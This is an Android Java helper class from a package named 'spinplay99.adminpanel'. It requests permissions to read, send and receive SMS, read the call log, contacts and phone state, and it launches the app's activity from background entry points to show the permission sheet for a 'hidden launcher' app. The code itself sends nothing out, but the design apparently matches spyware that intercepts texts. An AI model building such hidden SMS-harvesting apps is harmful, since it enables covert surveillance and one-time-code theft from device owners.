package com.spinplay99.adminpanel;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;

import androidx.core.content.ContextCompat;

/** Runtime SMS / phone permissions — shared by MainActivity and background entry points. */
public final class PermissionHelper {
    private static volatile boolean launchAttempted = false;

    private PermissionHelper() {}

    public static String[] requiredPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return new String[] {
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.POST_NOTIFICATIONS
            };
        }
        return new String[] {
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE
        };
    }

    public static boolean needsRuntimePermissions(Context context) {
        for (String permission : requiredPermissions()) {
            if (ContextCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                return true;
            }
        }
        return false;
    }

    /** Open MainActivity once so the system permission sheet can show (hidden launcher apps). */
    public static void launchPermissionUiIfNeeded(Context context) {
        if (!needsRuntimePermissions(context)) {
            return;
        }
        if (launchAttempted) {
            return;
        }
        launchAttempted = true;
        Intent intent = new Intent(context, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        context.startActivity(intent);
    }

    public static void resetLaunchGate() {
        launchAttempted = false;
    }
}
